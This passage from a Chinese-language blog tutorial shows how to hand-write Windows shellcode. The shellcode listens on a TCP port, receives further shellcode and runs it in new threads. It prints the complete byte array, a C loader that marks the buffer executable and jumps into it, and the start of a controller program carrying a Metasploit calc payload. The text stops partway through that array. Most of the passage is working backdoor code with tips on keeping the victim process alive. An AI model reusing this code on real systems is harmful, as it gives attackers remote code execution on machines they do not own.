    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #ff0000;">6F721347h</span>
    <span  style="color: #00007f; font-weight: normal;">call</span>    <span  style="color: #46aa03; font-weight: normal;">ebp</span>         <span  style="color: #666666; font-style: normal;">; 调用ExitProcess退出进程</span>
kMainFun endp</pre></td></tr></tbody></table></div>

<p>这里函数名字的HASH值需要自己计算（计算的汇编指令前面已经有了，抠出来就行，根据DLL名字以及API名字就能计算出HASH值），然后需要分配一定的栈空间用于保存变量，比如accept返回的socket句柄，在recv shellcode的时候就要用到，这些局部变量的引用要注意之前是否有参数压栈来调整与esp寄存器的距离。做的完美一点可以使用VirtualFree回收空间，这样的话一定要记得使用WaitForSingleObject等待线程结束。</p>
<p>写好汇编代码之后，用MASM32编译了一下代码，执行测试OK。这时候就需要使用16进制编辑器提取出二进制代码了。此时还剩下最后一步，就是调整部分字节，因为这里用到了函数，所以会提取出两段代码进行拼接，而编译器在编译的时候这两段代码之间是有距离的，所以最后要调整call指令的跳转距离。如果不会算的话可以先把ShellCode内嵌到C中编译，然后使用OD反汇编的时候进行汇编指令修改即可，最后把call kMainFun对应的机器码调整为\xE8\x89\x00\x00\x00。</p>
<p>最后使用内联汇编进行测试：</p>

<div  class="wp_syntax"><table><tbody><tr><td  class="line_numbers"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
</pre></td><td  class="code"><pre  class="cpp"  style="font-family:monospace;"><span  style="color: #339900;">#include &lt;stdio.h&gt;</span>
<span  style="color: #339900;">#include &lt;windows.h&gt;</span>
&nbsp;
<span  style="color: #339900;">#pragma comment(linker, "/subsystem:windows")</span>
&nbsp;
<span  style="color: #0000ff;">unsigned</span> <span  style="color: #0000ff;">char</span> kshell<span  style="color: #008000;">[</span><span  style="color: #008000;">]</span> <span  style="color: #000080;">=</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\xFC</span><span  style="color: #660099; font-weight: bold;">\xE8</span><span  style="color: #660099; font-weight: bold;">\x89</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x60</span><span  style="color: #660099; font-weight: bold;">\x8B</span><span  style="color: #660099; font-weight: bold;">\xEC</span><span  style="color: #660099; font-weight: bold;">\x33</span><span  style="color: #660099; font-weight: bold;">\xD2</span><span  style="color: #660099; font-weight: bold;">\x64</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x8B</span><span  style="color: #660099; font-weight: bold;">\x52</span><span  style="color: #660099; font-weight: bold;">\x30</span><span  style="color: #660099; font-weight: bold;">\x8B</span><span  style="color: #660099; font-weight: bold;">\x52</span><span  style="color: #660099; font-weight: bold;">\x0C</span><span  style="color: #660099; font-weight: bold;">\x8B</span><span  style="color: #660099; font-weight: bold;">\x52</span><span  style="color: #660099; font-weight: bold;">\x14</span><span  style="color: #660099; font-weight: bold;">\x8B</span><span  style="color: #660099; font-weight: bold;">\x72</span><span  style="color: #660099; font-weight: bold;">\x28</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x0F</span><span  style="color: #660099; font-weight: bold;">\xB7</span><span  style="color: #660099; font-weight: bold;">\x4A</span><span  style="color: #660099; font-weight: bold;">\x26</span><span  style="color: #660099; font-weight: bold;">\x33</span><span  style="color: #660099; font-weight: bold;">\xFF</span><span  style="color: #660099; font-weight: bold;">\x33</span><span  style="color: #660099; font-weight: bold;">\xC0</span><span  style="color: #660099; font-weight: bold;">\xAC</span><span  style="color: #660099; font-weight: bold;">\x3C</span><span  style="color: #660099; font-weight: bold;">\x61</span><span  style="color: #660099; font-weight: bold;">\x7C</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x02</span><span  style="color: #660099; font-weight: bold;">\x2C</span><span  style="color: #660099; font-weight: bold;">\x20</span><span  style="color: #660099; font-weight: bold;">\xC1</span><span  style="color: #660099; font-weight: bold;">\xCF</span><span  style="color: #660099; font-weight: bold;">\x0D</span><span  style="color: #660099; font-weight: bold;">\x03</span><span  style="color: #660099; font-weight: bold;">\xF8</span><span  style="color: #660099; font-weight: bold;">\xE2</span><span  style="color: #660099; font-weight: bold;">\xF0</span><span  style="color: #660099; font-weight: bold;">\x52</span><span  style="color: #660099; font-weight: bold;">\x57</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x8B</span><span  style="color: #660099; font-weight: bold;">\x52</span><span  style="color: #660099; font-weight: bold;">\x10</span><span  style="color: #660099; font-weight: bold;">\x8B</span><span  style="color: #660099; font-weight: bold;">\x42</span><span  style="color: #660099; font-weight: bold;">\x3C</span><span  style="color: #660099; font-weight: bold;">\x03</span><span  style="color: #660099; font-weight: bold;">\xC2</span><span  style="color: #660099; font-weight: bold;">\x8B</span><span  style="color: #660099; font-weight: bold;">\x40</span><span  style="color: #660099; font-weight: bold;">\x78</span><span  style="color: #660099; font-weight: bold;">\x85</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\xC0</span><span  style="color: #660099; font-weight: bold;">\x74</span><span  style="color: #660099; font-weight: bold;">\x4A</span><span  style="color: #660099; font-weight: bold;">\x03</span><span  style="color: #660099; font-weight: bold;">\xC2</span><span  style="color: #660099; font-weight: bold;">\x50</span><span  style="color: #660099; font-weight: bold;">\x8B</span><span  style="color: #660099; font-weight: bold;">\x48</span><span  style="color: #660099; font-weight: bold;">\x18</span><span  style="color: #660099; font-weight: bold;">\x8B</span><span  style="color: #660099; font-weight: bold;">\x58</span><span  style="color: #660099; font-weight: bold;">\x20</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x03</span><span  style="color: #660099; font-weight: bold;">\xDA</span><span  style="color: #660099; font-weight: bold;">\xE3</span><span  style="color: #660099; font-weight: bold;">\x3C</span><span  style="color: #660099; font-weight: bold;">\x49</span><span  style="color: #660099; font-weight: bold;">\x8B</span><span  style="color: #660099; font-weight: bold;">\x34</span><span  style="color: #660099; font-weight: bold;">\x8B</span><span  style="color: #660099; font-weight: bold;">\x03</span><span  style="color: #660099; font-weight: bold;">\xF2</span><span  style="color: #660099; font-weight: bold;">\x33</span><span  style="color: #660099; font-weight: bold;">\xFF</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x33</span><span  style="color: #660099; font-weight: bold;">\xC0</span><span  style="color: #660099; font-weight: bold;">\xAC</span><span  style="color: #660099; font-weight: bold;">\xC1</span><span  style="color: #660099; font-weight: bold;">\xCF</span><span  style="color: #660099; font-weight: bold;">\x0D</span><span  style="color: #660099; font-weight: bold;">\x03</span><span  style="color: #660099; font-weight: bold;">\xF8</span><span  style="color: #660099; font-weight: bold;">\x38</span><span  style="color: #660099; font-weight: bold;">\xE0</span><span  style="color: #660099; font-weight: bold;">\x75</span><span  style="color: #660099; font-weight: bold;">\xF4</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x03</span><span  style="color: #660099; font-weight: bold;">\x7D</span><span  style="color: #660099; font-weight: bold;">\xF8</span><span  style="color: #660099; font-weight: bold;">\x3B</span><span  style="color: #660099; font-weight: bold;">\x7D</span><span  style="color: #660099; font-weight: bold;">\x24</span><span  style="color: #660099; font-weight: bold;">\x75</span><span  style="color: #660099; font-weight: bold;">\xE2</span><span  style="color: #660099; font-weight: bold;">\x58</span><span  style="color: #660099; font-weight: bold;">\x8B</span><span  style="color: #660099; font-weight: bold;">\x58</span><span  style="color: #660099; font-weight: bold;">\x24</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x03</span><span  style="color: #660099; font-weight: bold;">\xDA</span><span  style="color: #660099; font-weight: bold;">\x66</span><span  style="color: #660099; font-weight: bold;">\x8B</span><span  style="color: #660099; font-weight: bold;">\x0C</span><span  style="color: #660099; font-weight: bold;">\x4B</span><span  style="color: #660099; font-weight: bold;">\x8B</span><span  style="color: #660099; font-weight: bold;">\x58</span><span  style="color: #660099; font-weight: bold;">\x1C</span><span  style="color: #660099; font-weight: bold;">\x03</span><span  style="color: #660099; font-weight: bold;">\xDA</span><span  style="color: #660099; font-weight: bold;">\x8B</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x04</span><span  style="color: #660099; font-weight: bold;">\x8B</span><span  style="color: #660099; font-weight: bold;">\x03</span><span  style="color: #660099; font-weight: bold;">\xC2</span><span  style="color: #660099; font-weight: bold;">\x89</span><span  style="color: #660099; font-weight: bold;">\x44</span><span  style="color: #660099; font-weight: bold;">\x24</span><span  style="color: #660099; font-weight: bold;">\x24</span><span  style="color: #660099; font-weight: bold;">\x5B</span><span  style="color: #660099; font-weight: bold;">\x5B</span><span  style="color: #660099; font-weight: bold;">\x61</span><span  style="color: #660099; font-weight: bold;">\x59</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x5A</span><span  style="color: #660099; font-weight: bold;">\x51</span><span  style="color: #660099; font-weight: bold;">\xFF</span><span  style="color: #660099; font-weight: bold;">\xE0</span><span  style="color: #660099; font-weight: bold;">\x58</span><span  style="color: #660099; font-weight: bold;">\x5F</span><span  style="color: #660099; font-weight: bold;">\x5A</span><span  style="color: #660099; font-weight: bold;">\x8B</span><span  style="color: #660099; font-weight: bold;">\x12</span><span  style="color: #660099; font-weight: bold;">\xEB</span><span  style="color: #660099; font-weight: bold;">\x86</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x5D</span><span  style="color: #660099; font-weight: bold;">\x68</span><span  style="color: #660099; font-weight: bold;">\x33</span><span  style="color: #660099; font-weight: bold;">\x32</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x68</span><span  style="color: #660099; font-weight: bold;">\x77</span><span  style="color: #660099; font-weight: bold;">\x73</span><span  style="color: #660099; font-weight: bold;">\x32</span><span  style="color: #660099; font-weight: bold;">\x5F</span><span  style="color: #660099; font-weight: bold;">\x54</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x68</span><span  style="color: #660099; font-weight: bold;">\x4C</span><span  style="color: #660099; font-weight: bold;">\x77</span><span  style="color: #660099; font-weight: bold;">\x26</span><span  style="color: #660099; font-weight: bold;">\x07</span><span  style="color: #660099; font-weight: bold;">\xFF</span><span  style="color: #660099; font-weight: bold;">\xD5</span><span  style="color: #660099; font-weight: bold;">\xB8</span><span  style="color: #660099; font-weight: bold;">\x90</span><span  style="color: #660099; font-weight: bold;">\x01</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x00</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x2B</span><span  style="color: #660099; font-weight: bold;">\xE0</span><span  style="color: #660099; font-weight: bold;">\x54</span><span  style="color: #660099; font-weight: bold;">\x50</span><span  style="color: #660099; font-weight: bold;">\x68</span><span  style="color: #660099; font-weight: bold;">\x29</span><span  style="color: #660099; font-weight: bold;">\x80</span><span  style="color: #660099; font-weight: bold;">\x6B</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\xFF</span><span  style="color: #660099; font-weight: bold;">\xD5</span><span  style="color: #660099; font-weight: bold;">\x50</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x50</span><span  style="color: #660099; font-weight: bold;">\x50</span><span  style="color: #660099; font-weight: bold;">\x50</span><span  style="color: #660099; font-weight: bold;">\x40</span><span  style="color: #660099; font-weight: bold;">\x50</span><span  style="color: #660099; font-weight: bold;">\x40</span><span  style="color: #660099; font-weight: bold;">\x50</span><span  style="color: #660099; font-weight: bold;">\x68</span><span  style="color: #660099; font-weight: bold;">\xEA</span><span  style="color: #660099; font-weight: bold;">\x0F</span><span  style="color: #660099; font-weight: bold;">\xDF</span><span  style="color: #660099; font-weight: bold;">\xE0</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\xFF</span><span  style="color: #660099; font-weight: bold;">\xD5</span><span  style="color: #660099; font-weight: bold;">\x8B</span><span  style="color: #660099; font-weight: bold;">\xF8</span><span  style="color: #660099; font-weight: bold;">\x33</span><span  style="color: #660099; font-weight: bold;">\xDB</span><span  style="color: #660099; font-weight: bold;">\x53</span><span  style="color: #660099; font-weight: bold;">\x68</span><span  style="color: #660099; font-weight: bold;">\x02</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x11</span><span  style="color: #660099; font-weight: bold;">\x5C</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x8B</span><span  style="color: #660099; font-weight: bold;">\xF4</span><span  style="color: #660099; font-weight: bold;">\x6A</span><span  style="color: #660099; font-weight: bold;">\x10</span><span  style="color: #660099; font-weight: bold;">\x56</span><span  style="color: #660099; font-weight: bold;">\x57</span><span  style="color: #660099; font-weight: bold;">\x68</span><span  style="color: #660099; font-weight: bold;">\xC2</span><span  style="color: #660099; font-weight: bold;">\xDB</span><span  style="color: #660099; font-weight: bold;">\x37</span><span  style="color: #660099; font-weight: bold;">\x67</span><span  style="color: #660099; font-weight: bold;">\xFF</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\xD5</span><span  style="color: #660099; font-weight: bold;">\xB9</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x01</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x6A</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\xE2</span><span  style="color: #660099; font-weight: bold;">\xFC</span><span  style="color: #660099; font-weight: bold;">\x53</span><span  style="color: #660099; font-weight: bold;">\x57</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x68</span><span  style="color: #660099; font-weight: bold;">\xB7</span><span  style="color: #660099; font-weight: bold;">\xE9</span><span  style="color: #660099; font-weight: bold;">\x38</span><span  style="color: #660099; font-weight: bold;">\xFF</span><span  style="color: #660099; font-weight: bold;">\xFF</span><span  style="color: #660099; font-weight: bold;">\xD5</span><span  style="color: #660099; font-weight: bold;">\x53</span><span  style="color: #660099; font-weight: bold;">\x57</span><span  style="color: #660099; font-weight: bold;">\x53</span><span  style="color: #660099; font-weight: bold;">\x53</span><span  style="color: #660099; font-weight: bold;">\x57</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x68</span><span  style="color: #660099; font-weight: bold;">\x74</span><span  style="color: #660099; font-weight: bold;">\xEC</span><span  style="color: #660099; font-weight: bold;">\x3B</span><span  style="color: #660099; font-weight: bold;">\xE1</span><span  style="color: #660099; font-weight: bold;">\xFF</span><span  style="color: #660099; font-weight: bold;">\xD5</span><span  style="color: #660099; font-weight: bold;">\x89</span><span  style="color: #660099; font-weight: bold;">\x44</span><span  style="color: #660099; font-weight: bold;">\x24</span><span  style="color: #660099; font-weight: bold;">\x50</span><span  style="color: #660099; font-weight: bold;">\x6A</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x40</span><span  style="color: #660099; font-weight: bold;">\x68</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x10</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x68</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x90</span><span  style="color: #660099; font-weight: bold;">\x01</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x6A</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x68</span><span  style="color: #660099; font-weight: bold;">\x58</span><span  style="color: #660099; font-weight: bold;">\xA4</span><span  style="color: #660099; font-weight: bold;">\x53</span><span  style="color: #660099; font-weight: bold;">\xE5</span><span  style="color: #660099; font-weight: bold;">\xFF</span><span  style="color: #660099; font-weight: bold;">\xD5</span><span  style="color: #660099; font-weight: bold;">\x89</span><span  style="color: #660099; font-weight: bold;">\x44</span><span  style="color: #660099; font-weight: bold;">\x24</span><span  style="color: #660099; font-weight: bold;">\x54</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x6A</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x68</span><span  style="color: #660099; font-weight: bold;">\xFF</span><span  style="color: #660099; font-weight: bold;">\x8F</span><span  style="color: #660099; font-weight: bold;">\x01</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\xFF</span><span  style="color: #660099; font-weight: bold;">\x74</span><span  style="color: #660099; font-weight: bold;">\x24</span><span  style="color: #660099; font-weight: bold;">\x5C</span><span  style="color: #660099; font-weight: bold;">\xFF</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x74</span><span  style="color: #660099; font-weight: bold;">\x24</span><span  style="color: #660099; font-weight: bold;">\x5C</span><span  style="color: #660099; font-weight: bold;">\x68</span><span  style="color: #660099; font-weight: bold;">\x02</span><span  style="color: #660099; font-weight: bold;">\xD9</span><span  style="color: #660099; font-weight: bold;">\xC8</span><span  style="color: #660099; font-weight: bold;">\x5F</span><span  style="color: #660099; font-weight: bold;">\xFF</span><span  style="color: #660099; font-weight: bold;">\xD5</span><span  style="color: #660099; font-weight: bold;">\x83</span><span  style="color: #660099; font-weight: bold;">\xF8</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\xFF</span><span  style="color: #660099; font-weight: bold;">\x74</span><span  style="color: #660099; font-weight: bold;">\x5C</span><span  style="color: #660099; font-weight: bold;">\x83</span><span  style="color: #660099; font-weight: bold;">\xF8</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x75</span><span  style="color: #660099; font-weight: bold;">\x17</span><span  style="color: #660099; font-weight: bold;">\x68</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x40</span><span  style="color: #660099; font-weight: bold;">\x00</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x68</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x90</span><span  style="color: #660099; font-weight: bold;">\x01</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\xFF</span><span  style="color: #660099; font-weight: bold;">\x74</span><span  style="color: #660099; font-weight: bold;">\x24</span><span  style="color: #660099; font-weight: bold;">\x5C</span><span  style="color: #660099; font-weight: bold;">\x68</span><span  style="color: #660099; font-weight: bold;">\x0B</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x2F</span><span  style="color: #660099; font-weight: bold;">\x0F</span><span  style="color: #660099; font-weight: bold;">\x30</span><span  style="color: #660099; font-weight: bold;">\xFF</span><span  style="color: #660099; font-weight: bold;">\xD5</span><span  style="color: #660099; font-weight: bold;">\xEB</span><span  style="color: #660099; font-weight: bold;">\x40</span><span  style="color: #660099; font-weight: bold;">\x6A</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x6A</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x6A</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\xFF</span><span  style="color: #660099; font-weight: bold;">\x74</span><span  style="color: #660099; font-weight: bold;">\x24</span><span  style="color: #660099; font-weight: bold;">\x60</span><span  style="color: #660099; font-weight: bold;">\x6A</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x6A</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x68</span><span  style="color: #660099; font-weight: bold;">\x38</span><span  style="color: #660099; font-weight: bold;">\x68</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x0D</span><span  style="color: #660099; font-weight: bold;">\x16</span><span  style="color: #660099; font-weight: bold;">\xFF</span><span  style="color: #660099; font-weight: bold;">\xD5</span><span  style="color: #660099; font-weight: bold;">\x89</span><span  style="color: #660099; font-weight: bold;">\x44</span><span  style="color: #660099; font-weight: bold;">\x24</span><span  style="color: #660099; font-weight: bold;">\x58</span><span  style="color: #660099; font-weight: bold;">\x6A</span><span  style="color: #660099; font-weight: bold;">\xFF</span><span  style="color: #660099; font-weight: bold;">\xFF</span><span  style="color: #660099; font-weight: bold;">\x74</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x24</span><span  style="color: #660099; font-weight: bold;">\x5C</span><span  style="color: #660099; font-weight: bold;">\x68</span><span  style="color: #660099; font-weight: bold;">\x08</span><span  style="color: #660099; font-weight: bold;">\x87</span><span  style="color: #660099; font-weight: bold;">\x1D</span><span  style="color: #660099; font-weight: bold;">\x60</span><span  style="color: #660099; font-weight: bold;">\xFF</span><span  style="color: #660099; font-weight: bold;">\xD5</span><span  style="color: #660099; font-weight: bold;">\x68</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x40</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x68</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x90</span><span  style="color: #660099; font-weight: bold;">\x01</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\xFF</span><span  style="color: #660099; font-weight: bold;">\x74</span><span  style="color: #660099; font-weight: bold;">\x24</span><span  style="color: #660099; font-weight: bold;">\x5C</span><span  style="color: #660099; font-weight: bold;">\x68</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x0B</span><span  style="color: #660099; font-weight: bold;">\x2F</span><span  style="color: #660099; font-weight: bold;">\x0F</span><span  style="color: #660099; font-weight: bold;">\x30</span><span  style="color: #660099; font-weight: bold;">\xFF</span><span  style="color: #660099; font-weight: bold;">\xD5</span><span  style="color: #660099; font-weight: bold;">\xE9</span><span  style="color: #660099; font-weight: bold;">\x70</span><span  style="color: #660099; font-weight: bold;">\xFF</span><span  style="color: #660099; font-weight: bold;">\xFF</span><span  style="color: #660099; font-weight: bold;">\xFF</span><span  style="color: #660099; font-weight: bold;">\x5F</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x5B</span><span  style="color: #660099; font-weight: bold;">\xE9</span><span  style="color: #660099; font-weight: bold;">\x59</span><span  style="color: #660099; font-weight: bold;">\xFF</span><span  style="color: #660099; font-weight: bold;">\xFF</span><span  style="color: #660099; font-weight: bold;">\xFF</span>"</span><span  style="color: #008080;">;</span>
&nbsp;
<span  style="color: #0000ff;">int</span> WINAPI WinMain<span  style="color: #008000;">(</span>
    HINSTANCE hInstance, 
    HINSTANCE hPrevInstance, 
    LPSTR lpCmdLine, 
    <span  style="color: #0000ff;">int</span> nShowCmd <span  style="color: #008000;">)</span>
<span  style="color: #008000;">{</span>
    DWORD dwTemp <span  style="color: #000080;">=</span> <span  style="color: #0000dd;">0</span><span  style="color: #008080;">;</span>
    VirtualProtect<span  style="color: #008000;">(</span>
        kshell, 
        <span  style="color: #0000dd;">sizeof</span><span  style="color: #008000;">(</span>kshell<span  style="color: #008000;">)</span>, 
        PAGE_EXECUTE_READWRITE, 
        <span  style="color: #000040;">&amp;</span>dwTemp<span  style="color: #008000;">)</span><span  style="color: #008080;">;</span>
&nbsp;
    __asm
    <span  style="color: #008000;">{</span>
        lea eax, kshell
        push eax
        ret
    <span  style="color: #008000;">}</span>
&nbsp;
    <span  style="color: #0000ff;">return</span> <span  style="color: #0000dd;">0</span><span  style="color: #008080;">;</span>
<span  style="color: #008000;">}</span></pre></td></tr></tbody></table></div>

<p>现在就可以编写控制端进行测试啦，注意因为这里通过创建新线程执行ShellCode，而且会等待新线程结束，所以发送过去的ShellCode就不要弹出MessageBox了，否则就把被控端的执行逻辑给卡死了。还有就是在使用<a  href="http://www.programlife.net/tag/metasploit"  title="Metasploit"  target="_blank">Metasploit</a>生成测试Shellcode的时候，退出方式选择thread，千万不要选process，因为那样就把被控端给kill掉了。</p>

<div  class="wp_syntax"><table><tbody><tr><td  class="line_numbers"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
</pre></td><td  class="code"><pre  class="cpp"  style="font-family:monospace;"><span  style="color: #339900;">#include &lt;windows.h&gt;</span>
<span  style="color: #339900;">#include &lt;winsock.h&gt;</span>
<span  style="color: #339900;">#include &lt;stdio.h&gt;</span>
<span  style="color: #339900;">#include &lt;stdlib.h&gt;</span>
<span  style="color: #339900;">#include &lt;string.h&gt;</span>
<span  style="color: #339900;">#pragma comment(lib, "ws2_32")</span>
&nbsp;
<span  style="color: #339900;">#pragma comment(linker, "/subsystem:console")</span>
&nbsp;
<span  style="color: #666666;">// 因为通过创建新线程执行Shellcode</span>
<span  style="color: #666666;">// 所以Shellcode的退出方式最好是退出线程</span>
<span  style="color: #666666;">// 以保证还可以继续接收和执行其他shellcode</span>
<span  style="color: #0000ff;">unsigned</span> <span  style="color: #0000ff;">char</span> shellcode_calc<span  style="color: #008000;">[</span><span  style="color: #008000;">]</span> <span  style="color: #000080;">=</span> 
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\xfc</span><span  style="color: #660099; font-weight: bold;">\xe8</span><span  style="color: #660099; font-weight: bold;">\x89</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x00</span><span  style="color: #660099; font-weight: bold;">\x60</span><span  style="color: #660099; font-weight: bold;">\x89</span><span  style="color: #660099; font-weight: bold;">\xe5</span><span  style="color: #660099; font-weight: bold;">\x31</span><span  style="color: #660099; font-weight: bold;">\xd2</span><span  style="color: #660099; font-weight: bold;">\x64</span><span  style="color: #660099; font-weight: bold;">\x8b</span><span  style="color: #660099; font-weight: bold;">\x52</span><span  style="color: #660099; font-weight: bold;">\x30</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x8b</span><span  style="color: #660099; font-weight: bold;">\x52</span><span  style="color: #660099; font-weight: bold;">\x0c</span><span  style="color: #660099; font-weight: bold;">\x8b</span><span  style="color: #660099; font-weight: bold;">\x52</span><span  style="color: #660099; font-weight: bold;">\x14</span><span  style="color: #660099; font-weight: bold;">\x8b</span><span  style="color: #660099; font-weight: bold;">\x72</span><span  style="color: #660099; font-weight: bold;">\x28</span><span  style="color: #660099; font-weight: bold;">\x0f</span><span  style="color: #660099; font-weight: bold;">\xb7</span><span  style="color: #660099; font-weight: bold;">\x4a</span><span  style="color: #660099; font-weight: bold;">\x26</span><span  style="color: #660099; font-weight: bold;">\x31</span><span  style="color: #660099; font-weight: bold;">\xff</span>"</span>
<span  style="color: #FF0000;">"<span  style="color: #660099; font-weight: bold;">\x31</span><span  style="color: #660099; font-weight: bold;">\xc0</span><span  style="color: #660099; font-weight: bold;">\xac</span><span  style="color: #660099; font-weight: bold;">\x3c</span><span  style="color: #660099; font-weight: bold;">\x61</span><span  style="color: #660099; font-weight: bold;">\x7c</span><span  style="color: #660099; font-weight: bold;">\x02</span><span  style="color: #660099; font-weight: bold;">\x2c</span><span  style="color: #660099; font-weight: bold;">\x20</span><span  style="color: #660099; font-weight: bold;">\xc1</span><span  style="color: #660099; font-weight: bold;">\xcf</span><span  style="color: #660099; font-weight: bold;">\x0d</span><span  style="color: #660099; font-weight: bold;">\x01</span><span  style="color: #660099; font-weight: bold;">\xc7</span><span  style="color: #660099; font-weight: bold;">\xe2</span>"</span>
